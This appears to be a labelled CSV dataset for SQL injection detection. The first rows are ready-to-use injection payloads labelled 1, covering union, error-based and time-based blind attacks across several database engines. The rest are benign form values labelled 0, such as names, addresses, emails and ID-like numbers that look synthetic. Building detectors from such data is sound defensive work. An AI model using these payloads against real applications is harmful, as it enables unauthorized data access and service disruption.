Sentence,Label
1   )    )     )   union all select null--,1
-4586 union all select 2068206820682068--,1
1   )    )    as wwys where 9248  =  9248,1
"1""  )   and updatexml  (  3393concat  (  0x2e0x7171706a71  (  select   (  elt  (  3393  =  33931   )    )     )  0x717a767a71  )  1161  )   and   (  ""mlld"" like ""mlld",1
-6085 or 5023  =  ctxsys.drithsx.sn  (  5023  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ,1
"select like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""%""  =  """,1
1%'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  0  )  5000000000  )  null  )   and    (    (     (  '%'  =  ',1
1  )   where 1622  =  1622,1
"1%""   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,1
"1""   )    )    union all select nullnull#",1
"1""   )    )    as gprr where 5975  =  5975 and 2388  =  benchmark  (  5000000md5  (  0x6d457153   )    )   #",1
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  15000000   )    )    and    (    (     (  ""ynwr"" like ""ynwr",1
1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi,1
1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )  # cgow,1
1'   )    )    as hqhs where 5383  =  5383,1
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'ucpa'  =  'ucpa,1
" end and ""%""  =  """,1
"1"" or 8384  =  like  (  'abcdefg'upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1
1 where 4985  =  4985 order by 1#,1
-7710' where 5658  =  5658 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"-6363""  )   where 4043  =  4043 union all select 404340434043404340434043404340434043--",1
1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  8113  =  81131   )    )     )  0x717a767a710x78   )    )   s  )   8446744073709551610 8446744073709551610   )    )     )   and    (    (   'nlnk' like 'nlnk,1
"-2898"" where 3301  =  3301 union all select 3301330133013301330133013301330133013301#",1
1 where 9932  =  9932,1
1'  (  case when 2872  =  2872 then 1 else null end  )  ,1
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
1' where 1045  =  1045 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
"1"" where 7344  =  7344 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --",1
1'  )   as chla where 6098  =  6098,1
1 union all select nullnullnullnullnullnullnullnull#,1
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  '%'  =  ',1
"-2033""  )   or 1 group by concat  (  0x7171706a71  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   0x717a767a71floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"1%""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1sysusers as sys2sysusers as sys3sysusers as sys4sysusers as sys5sysusers as sys6sysusers as sys7  )  --",1
1'||  (  select 'fpfl' from dual where 1434  =  1434 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null   )    )   ||',1
1   )    )     )   rlike sleep  (  5  )  #,1
  (  select count  (  *  )   from generate_series  (  15000000   )    )   ,1
"-1504""  )   as wpes where 6256  =  6256 union all select 6256625662566256625662566256625662566256#",1
1  )   where 9683  =  9683,1
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
1  )   union all select null--,1
1'  )   and elt  (  1210  =  1210sleep  (  5   )    )   ,1
1 where 6040  =  6040 and 9660  =    (  select count  (  *  )   from all_users t1all_users t2all_users t3all_users t4all_users t5  )  --,1
"-4954%""  )   or 5244  =  4832",1
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""fkmh""  =  ""fkmh",1
-8045   )    )     )   order by 1--,1
1'  )   where 4786  =  4786 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  8113  =  81131   )    )     )  0x717a767a710x78   )    )   s  )   8446744073709551610 8446744073709551610   )    )     )  --,1
"1%"" order by 1--",1
1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1"" union all select nullnullnullnullnullnullnull--",1
1   )    )    as queb where 2449  =  2449 union all select nullnull#,1
1'   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  0  )  500000000  )  null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  'javh'  =  'javh,1
1'  )   where 8167  =  8167,1
1'   )    )    as hmyc where 6732  =  6732 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71  (  select   (  elt  (  8190  =  81901   )    )     )  0x717a767a710x78   )    )   x   )    )   --,1
-9150%'   )    )     )   union all select 70577057705770577057705770577057--,1
"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""asvy""  =  ""asvy",1
"1""   )    )     )  ",1
-6760 or 1570  =  convert  (  int  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # ikqw,1
1'iif  (  6625  =  662511/0  )  ,1
select count  (  *  )   from generate_series  (  15000000  )   and    (    (   'jloi'  =  'jloi,1
"1""   )    )    as hace where 8785  =  8785",1
1%'  )   and 8734  =  5844,1
1 rlike sleep  (  5  ) ,1
"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --",1
"-9133""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""crfy""  =  ""crfy",1
1'+  (  select ntym where 4750  =  4750,1
"1""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1sysibm.systables as t2sysibm.systables as t3  )   and    (    (     (  ""jgoq""  =  ""jgoq",1
1' where 9116  =  9116 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )  --,1
-5089'   )    )    as icbb where 1129  =  1129 or 6250  =  9650,1
-5703'  )   or elt  (  2972  =  87088708  )  ,1
-6851'  )   or 1570  =  convert  (  int  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'csfx'  =  'csfx,1
"1""  )   where 8153  =  8153",1
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,1
1  )   where 2918  =  2918 and 7533  =  7533--,1
"-8609%""   )    )     )   union all select 602160216021602160216021--",1
select benchmark  (  5000000md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp,1
"1%"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""%""  =  """,1
"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1domain.columns as t2domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",1
1   )    )    as rwsn where 9946  =  9946 or extractvalue  (  1297concat  (  0x5c0x7171706a71  (  select   (  elt  (  1297  =  12971   )    )     )  0x717a767a71   )    )   --,1
1'+  (  select wjpc where 5943  =  5943 and make_set  (  8403  =  84038899   )    )   +',1
1%'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  null  )  0  )  500000000  )  null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   '%'  =  ',1
-9456%'   )    )     )   order by 1#,1
99745017c,0
ejerci78,0
47209,0
calle valencia de don juan 161 7?d,0
b3r3al,0
46942381w,0
elder@parcalia.hn,0
24596413y,0
compte,0
2366,0
leshowit,0
lehar,0
45699398p,0
calle profesor angel lacalle s/n,0
tardn,0
3549370000000000,0
14100,0
rigby,0
caada del hoyo,0
45641,0
englert,0
threader,0
elias pallares,0
f1581il2ente,0
57317186j,0
bocana$da,0
escarpelo,0
43785,0
3.4008E+015,0
lu,0
calle limones 60,0
hana,0
dillard,0
casas de miravete,0
olea de boedo,0
empuar,0
0o380ado6,0
montroy,0
99997973e,0
8364039999999999,0
grupo fuensanta 197 12?a,0
jalance,0
420136000000000,0
c/ ricardo gutierrez 26 8-d,0
ivancevi,0
castil de vela,0
genaro,0
ergasto,0
llosa de ranes la,0
es2eri5o,0
cuenca,0
02054707w,0
21184515c,0
5714390000000000,0
41110,0
marcano giner,0
lemoine5@informatica2009.zr,0
pr3caz,0
37130,0
marsh@comerciosaspe.ke,0
inescourt7@citycvs.mil,0
c/ julia minguillon 179 7-a,0
obsequ.iosa,0
calle carlos amel 32 12?h,0
kallewar,0
59760678p,0
5240,0
toperzer1,0
canaan,0
suzuki,0
antigua de ancora s/n,0
calle dean miranda 106 6-f,0
10380,0
madgett,0
gerola pugliesi,0
36574,0
c/ comedias 109,0
8616890000000000,0
tanchak,0
don quijote 81,0
ceferina,0
saturnino,0
israel_piggot@joyclub.pe,0
5n37do,0
lanfranchi@getgold.tl,0
micaas,0
herrmann@codwatw.edu,0
9.48E+015,0
5838990000000000,0
ajoy,0
irissou,0
quisto,0
s5bal850de,0
balsam-prey@mmo.com.cat,0
lurlene,0
c/ elvas 112 13-a,0
de canoves 13,0
hembrick,0
1.76488E+015,0
darcy@google-movil.dz,0
katia,0
lenya@fbi-criminal-network.com.mil,0
3818940000000000,0
penarroya ingla,0
6657410000000000,0
calle artigako haritza s/n 8?d,0
kiyohara,0
iracema,0
2719,0
recabdador,0
40142,0
bernadet,0
76150645z,0
29540,0
nehemiah,0
reiji,0
plaa gabriela mistral 140,0
mirabel,0
sanidad,0
arriharn espinet,0
alguer murillo,0
47419,0
swearing,0
lightfie,0
epnimo,0
guillen,0
mahbeer,0
zohar@pablobracamonte.bh,0
azarshah,0
m7124v3,0
medianero,0
euzaine@schnapps.com.gs,0
amelia,0
estival,0
3980000000000000,0
calle manco 109 10-g,0
vinko,0
parke antonio trueba 175,0
8513800000000000,0
9.84215E+015,0
calle la revoltosa 55 11c,0
calle hostieros 24,0
condensativo,0
44706,0
5889770000000000,0
poma gozalbo,0
40592671v,0
contreras,0
18611,0
ma724-3ra,0
olaya,0
17744,0
7118,0
19219,0
lula,0
9.84is22nte334c799,0
rub de bracamonte,0
75771832b,0
muthuswa,0
d76en3r9n8z01,0
c/ padilla 74 12h,0
8851190000000001,0
salter@quiromante.com.mg,0
es3regamiento,0
aflechate,0
63829565b,0
60613075w,0
freydig rueda,0
itrabo,0
credido poma,0
29491,0
1064,0
gula,0
de1l2nda9ur4,0
c/ honduras 139 7-a,0
vajih,0
salinillas de bureba,0
6267,0
c/ san ildefonso 106 10?h,0
goldsmith1@esmarbella.ht,0
arraia-maeztu,0
34112,0
protoalbitar,0
pontevedra,0
savoula,0
2144,0
albeta,0
96761343k,0
lamentante,0
50159319e,0
andrs castanyer,0
neugebauer@buscamoto.gw,0
harmony,0
vlez acejas,0
enlutada,0
gabriela1,0
c/ david 169 6-h,0
methi,0
graciliano,0
61,0
4.13841E+015,0
steele,0
1440000000000000,0
brockie,0
depredador,0
comalada,0
7633,0
robledo,0
37793,0
archie,0
47649,0
4a2ho4a2o,0
c/ coca de la piera 167,0
oseja,0
31410,0
1075440000000000,0
36823414t,0
ginest baquedano,0
mallo etchart,0
nanclares espejo,0
serpiginoso,0
calle dinamarca 14,0
72523597c,0
67242195q,0
6051280000000000,0
aricel,0
c/ concepcion alexandre 82,0
v5llo34,0
burg,0
4135,0
10161,0
chorrito bajo 11,0
8623,0
l1b6855ca30e,0
en546al,0
c/ el breton 187,0
koichi,0
lamarr@tardos.mobi,0
mieza,0
16154,0
salgado,0
16118,0
zapardiel de la ribera,0
maughan@enfuerteventura.com.rw,0
15994230f,0
nazareno,0
shou-che,0
24152,0
villalobn,0
cardedeu 54,0
pl. curro cuchares 72,0
romeral el,0
10300,0
firat6,0
calle marino cervera 173,0
sparky,0
strock,0
radunsky_oses@guejosgratis.cg,0
alfredo calderon 136,0
hanzlice,0
paucides,0
6030070000000000,0
puigpunyent,0
zangn,0
chilln,0
6110,0
galindo beneyto,0
ayyuce,0
de_la,0
aventino,0
47185,0
5ecom058a?8a,0
lugar los morros 50 9?c,0
hinkie@goovitae.pg,0
58305784w,0
9.26768E+015,0
grimm@madrid2012.nu,0
michigan,0
igal,0
c/ hermanos pinzon 178,0
grandy,0
serneo,0
bellaguarda,0
cuesta sagrado corazon 155 5?a,0
pike@multasdetransito.gf,0
veneranda,0
torre de arcas,0
darrieu@redstarz.sv,0
sntoma,0
niu,0
eduviges,0
42010181z,0
minera dauns,0
8961250000000000,0
arima@hormigon-impreso.nu,0
aguinaga achutegui,0
6905240000000000,0
bradney4,0
shanir,0
34855320q,0
wun,0
stanger-kitabayashi7@gestionsoftware.th,0
calle soria 154 2a,0
humfrey,0
1320,0
poncin@todobetis.mil,0
8170,0
inglis@baltasarsantos.vu,0
tindall-bourne@pintandomucho.cg,0
es518l132n,0
rajadell,0
ramblizo,0
d060u2ar,0
8349,0
brunton9,0
sile,0
8935,0
4542200000000000,0
1356890000000000,0
azcrate campalan,0
calle juan sebastian elcano 157 11?b,0
heicy,0
62,0
massimil,0
n89m3nd2,0
669143000000000,0
kindelan,0
a79ga44,0
49540097y,0
2753390000000000,0
ibarra,0
18898337l,0
47gent1r,0
estolano boget,0
sierra bermeja s/n,0
jimnez algora,0
ponsati puratic,0
ocallaghan@asyra.li,0
28670,0
calle joan salvat papasseit s/n,0
28721,0
nardi borgua,0
roger,0
san miguel de abona,0
denni,0
cercs,0
d0s9pi2car,0
o$ficinesca,0
conde,0
menju,0
mccollon@irmedia.ca,0
88360528w,0
16856,0
pesquisar,0
subidor,0
escudero ostria,0
calle conde de cartagena 97 5f,0
3672490000000000,0
3471,0
marines los,0
senda buen paso s/n,0
5366,0
henry@sms24h.tr,0
santaren,0
mejury8,0
38355013y,0
trooger_gereighty@quierocortinas.mil,0
06673981w,0
pche,0
hervs bediaga,0
longo,0
tunaroza capmany,0
37795,0
flixmara,0
roni,0
sertino,0
umbria 143,0
veri5icat1va,0
222584000000000,0
mouchet@007tv.fj,0
parolero,0
polanco,0
jackelyn,0
34310,0
9ar5i04o,0
indocto,0
kouraviev@socimi.com.gl,0
saleh,0
e72i4,0
sant andreu de la barca,0
f8av2,0
49211,0
karin,0
gu5cima,0
keng@glutenfreespain.lb,0
69671861p,0
doriot,0
6718610000000000,0
gregonio,0
38821598j,0
katy,0
angullo acosta,0
c63en13759,0
23611263s,0
29850288z,0
cancela,0
c/ grabador david roberts 154 1-h,0
1025490000000000,0
37110,0
de tena leguizamn,0
5154,0
eddisfor4,0
4560,0
4920790000000000,0
monvar/monver,0
pobla de segur 125,0
23670,0
3820740000000000,0
15318,0
8121,0
41713468r,0
3186630000000000,0
san petersburgo 165,0
71648159p,0
4176,0
gift@distritoeste.no,0
16601924h,0
segura reygadas,0
passeig gaudi 77 3-e,0
llasera,0
ca5r7211a,0
16610,0
cantoria,0
hallaran@manjarr.cd,0
haker-durango@mirallesmoscardo.ro,0
22010612a,0
trastabilln,0
rocco-misaki@soybueno.nz,0
20120,0
leonel,0
micr6pil8,0
calle puebla de los infantes 145,0
bscones de ojeda,0
ares,0
marcelino suarez 39,0
847,0
adalgisa,0
5150,0
88253687l,0
decour raichs,0
cusanelli@wdsl.ao,0
perpi izurrieta,0
robin@comerciosdeaspe.info,0
barcelona 149 5-e,0
66718383y,0
incom1a5abl8mente,0
leni,0
baril,0
35210254z,0
teddie,0
espaldilla,0
106705000000000,0
reiko,0
portelan9,0
50645313a,0
c28a3iz8,0
45370,0
benavente,0
99020664y,0
5arneci052,0
chimeneas,0
bose,0
041!da2131434e,0
5e011llo,0
c/ relfas 122,0
murillo el cuende,0
aa,0
c/ clivia 1 1?d,0
peral 180 4-b,0
3j,0
3411,0
carretera ribas matama 160,0
18567,0
arco del meson 47,0
57186589x,0
surai,0
3820,0
childree,0
712,0
bidaurreta,0
sfiroudi,0
caesar-vitez2@apelton.sy,0
56702228y,0
carrera,0
claudio,0
mary-ann,0
norberto,0
caldes,0
7280650000000000,0
42462633x,0
557ni03r5o,0
shakor,0
rasmia,0
tarp@redstarz.asia,0
seno,0
medwin-whittinghill@enla.th,0
rodolfo,0
hermanos gascon 141,0
28530,0
5083,0
soman,0
84411118z,0
45256,0
tornadizos de vila,0
calle santa teresa 87 5?b,0
incrdu69,0
llombai,0
800405000000000,0
ulrico,0
gatada,0
linton,0
gustat0v4,0
6273830000000000,0
81,0
huyente,0
m9gnificen5i5,0
werkmeister@19horas.zr,0
2100,0
22120,0
rabascall,0
braiam,0
8990910000000000,0
hofmeist0,0
calle duque de zaragoza s/n,0
c/ san guillermo 182,0
sahid,0
6660,0
wilde@casasdefamosos.zw,0
9903rti37,0
bablica,0
07485924e,0
5255020000000000,0
encuar,0
ramss,0
6160,0
0e06u8s17,0
4617330000000000,0
mclawhor,0
44338,0
fabrelle,0
hormilleja,0
mayor,0
28815,0
pascuala,0
malditamente,0
4478740000000000,0
5955500000000000,0
spaeth@directoriogratuito.kr,0
19784273h,0
84881293t,0
carretera estacion 144 8-d,0
coxcojita,0
mohandas,0
cel65co,0
3213960000000000,0
9805,0
75131649x,0
pierre-y,0
4.46813E+015,0
en8og1da,0
collado mediano,0
des7768ab9e6os,0
gabby,0
isasi urquiza,0
20001,0
cherino gebhardt,0
tracee,0
8615,0
3814,0
perdign el,0
c/ corua 25 3h,0
sangborivutr@ssextremadura.gr,0
tali,0
26256,0
3675,0
5458,0
camino san jaime 97,0
hoeflich@movil-google.cx,0
silvita,0
1133130000000000,0
02877417w,0
nardo 12 13e,0
toddi,0
8110,0
raddalgo,0
karlweiss@barnicesuv.gov,0
8219700000000000,0
26527823z,0
18449,0
c/ san miguel 111 6?f,0
946,0
dollie,0
castillejo de meslen,0
torrescrcela,0
travs elias,0
3074430000000000,0
pagni7@freecreditcheck.bg,0
noviercas,0
opsito,0
albillos,0
c/ espigo 0 10h,0
38182378d,0
lev@ozlon.ke,0
a3o1erada,0
5696,0
p4ot8tor,0
bullen,0
58265705n,0
42210,0
amorebieta-etxano,0
digott_sims@enigmatico.ar,0
makazaga millares,0
centeno,0
9464,0
pallen,0
bardallur,0
kri!sti,0
story.darby@hostingprofessional.mv,0
rorke,0
rohan,0
nassiet.birkin@cienciapolicial.gl,0
50549,0
50344,0
hirn,0
minas de riotinto,0
87853992h,0
greg,0
f36hu1a,0
trespaderne,0
thayra,0
despernada,0
90660924f,0
labaque pericas,0
villanueva de sigena,0
7050000000000000,0
c/ pintor viver s/n 1?b,0
barceo,0
2457460000000000,0
80216904b,0
axman@culturalsanpedrocf.ie,0
5564390000000000,0
rodo de la cerda,0
8355550000000001,0
roco daira,0
12480,0
4087910000000000,0
pe7tr0b9,0
breon@sexotelefono.mc,0
maryrose,0
tiru corominas,0
alfonso.julissa@naturalchild.tk,0
villanueva gualano,0
5076820000000000,0
74132716j,0
obscurantismo,0
enang.ostar,0
victoria,0
mediona,0
buch als,0
35807418y,0
diezma,0
birney-warbeck@lamejorplaya.gl,0
detleff3,0
6552400000000000,0
hoya-gonzalo,0
lawlik@housemovie.lk,0
pockett_miguelin@noviasteresapalacios.aw,0
demonlatra,0
05636576n,0
sugesto,0
jose gomez gallito 107,0
6243310000000000,0
trincha-32r1,0
5230,0
bernette2,0
bnrinfo,0
9mbaicin,0
1534180000000000,0
7ar82fa,0
yeladaky janeiro,0
9423,0
2190200000000000,0
calle horreo 85 10?d,0
thordsen@guejos.sy,0
alfajarn,0
bo8iner4,0
julin,0
calle arins 87 4?e,0
roca,0
2293,0
massaguer molin,0
20098056n,0
aedma@quadernideilgarda.ci,0
44650,0
2306,0
san perfecto 8,0
morn de almazn,0
peine3@psychominders.gob,0
kindermann@lawn.je,0
mio de san esteban,0
xerta,0
4126500000000000,0
leonila,0
boci+o,0
apolonio,0
conceptear,0
rigas.albalak@albeiteria.it,0
25330,0
tramaced,0
m86uca,0
sevilla,0
calle la salina 7 1?b,0
xtiva,0
andrease,0
6659100000000000,0
maribeth4,0
ci2586ta,0
38728859x,0
2210000000000000,0
stapley@cirugiaplasticacordoba.jm,0
plza. carmelo solis 78 4?g,0
22513,0
es3an7oso,0
07559284n,0
reto8sivo,0
32790960k,0
coomonte,0
morosa,0
modorrillo,0
glazer,0
pasaje magistrado salvador barbera 136,0
bru_na,0
e00tr6o,0
cuellar reino,0
warwicke@discon.mm,0
marella,0
c/ echegaray s/n,0
18243165w,0
c/ galvan 98 10?a,0
54180440f,0
holbrook,0
perr@pasajesaereosbaratos.pm,0
valencia 79 12?h,0
vilagut victori,0
46145,0
ehrenfri,0
villafranca del bierzo,0
beom-sah,0
tracisto arroyave,0
strom.mahieuy4@karldeux.ac,0
calle 300 al 8 del km. 1 puesta en riego 144,0
salhany0,0
el-gueba,0
31271,0
cebuano,0
16,0
pi y margall 17 7?f,0
8en7dill3,0
c/ barriada nueva andalucia 79 5?f,0
neusy,0
8349640000000001,0
stadler_munks@chevrolet-volt.at,0
ransell,0
5580430000000000,0
palacn aucapia,0
monteys bold,0
petree,0
c/ academia 59 3?g,0
randera,0
43877,0
prdica,0
rainmake,0
emilio arrieta 110 1f,0
lozier,0
feutlins,0
16926,0
2300000000000000,0
85766213h,0
rustir,0
barbads,0
emil,0
do cotaredo 147 9e,0
beln,0
7395,0
60,0
florescu,0
8a86ra7,0
nicolalde llovet,0
c/ 57 15 9g,0
des9o89451rac28,0
60996626m,0
3702,0
koprulu,0
7u4o84z1m07459,0
slezak@ballerpoker.kn,0
8318,0
pasaje santo angel 190,0
ferreries,0
20048048y,0
rei1@rtce.au,0
c/ mijancas 154 3?c,0
casaubn de rosa,0
olite,0
excusana,0
tabaquera,0
vargueo,0
dyck,0
zarrapastrosamente,0
efran,0
calle llorente 73,0
19392,0
paula,0
2252,0
c/ pozo seco 37 6-d,0
kjer@multibuscador.com.ph,0
ermina,0
47eg0,0
follosas,0
tait@ibizasounds.ir,0
siseo,0
nicole-meyer@creacionesdolcevita.us,0
gussack.reinecke@eddydaniele.pt,0
04146926a,0
4890000000000000,0
parola@zonamodelos.pl,0
schnirer,0
whiteside.seyfferrtitz@cohel.uk,0
c/ nicolas salmeron 73,0
2ovi4in,0
campello el,0
1916360000000000,0
huaranga chicon,0
valeika@italianmotorvillagesevilla.gd,0
aleandro-hayman@tecnoindomo.nr,0
dangers9@paremoselalzheimer.az,0
calle toronja 157,0
eoin,0
1.89129E+015,0
parra,0
jordi,0
morande,0
ignacio aldecoa 30 6h,0
c/jon de las moscas 72,0
28413,0
vilma,0
pasivamente,0
somisett,0
travolta@professionalhost.com.cn,0
29400,0
narita@deportechino.an,0
corulln,0
ulldecona,0
hi9dra,0
supersticin,0
jardines 110,0
tierga,0
688,0
rio nervion 177,0
koczian@decoaching.is,0
24768,0
10550,0
srdida.me3te,0
22115972t,0
dierkop@hayunmundoahifuera.id,0
a6ordab07,0
6187380000000000,0
c/ javea 57,0
haddon@hiperbarcelona.tl,0
3192910000000000,0
5192,0
machar,0
pl. heroes de espaa 20 11?g,0
ductilidad,0
campe6n,0
rattanap,0
garabana belart,0
jagdish,0
06363808f,0
9.5286E+015,0
valdebenito garabana,0
6991,0
hwei-lin,0
mcavoy-zabczynski@discotecateatre.gt,0
atolera,0
alexiana,0
lnguida/longida,0
37329,0
matacandelas,0
azorin 167,0
57584234p,0
33829,0
suen,0
natala,0
pap@evelin.com.ly,0
paisaje,0
0utaperc09,0
c/ san antonio 65 12?a,0
40984940k,0
tamer,0
santa eulalia de oscos,0
solana de los barros,0
yecla,0
kaempfe amilibia,0
garroch_ista,0
calle monte miramar s/n,0
quebrador,0
gabbai,0
backes@kimkardashian.com.lk,0
laws cabezon,0
maximinio,0
tejeda,0
a24a70re8a,0
sant aniol de finestres,0
17889538t,0
samieian7,0
1437,0
santamarina,0
6424,0
plza. salamanca 39,0
94lp90ulo,0
adolfo,0
5176680000000000,0
menelao,0
00903443a,0
lores bigas,0
nadav6,0
calle vizcaya 101 10?f,0
17621392b,0
royo el,0
120958000000000,0
fickes,0
reencarnar,0
cabarrs zafn,0
p21urit56,0
eu,0
750,0
forcarei,0
40355743n,0
44315,0
9600,0
lzaro,0
9.0515E+015,0
satorras maynol,0
santibez de ecla,0
7751,0
4859430000000000,0
9270,0
31049,0
flis@14horas.gt,0
pineda de la sierra,0
65,0
cercedilla,0
sienes,0
celfa,0
46388,0
masmitj,0
44588,0
imperial 143,0
zurueta olarte,0
gnaeding,0
c/ pablo iglesias 116,0
entendimiento,0
c/ tamesis 39 1?c,0
largueado,0
12190,0
49126,0
p1oro3o,0
crisp vivo,0
falset,0
aguistin,0
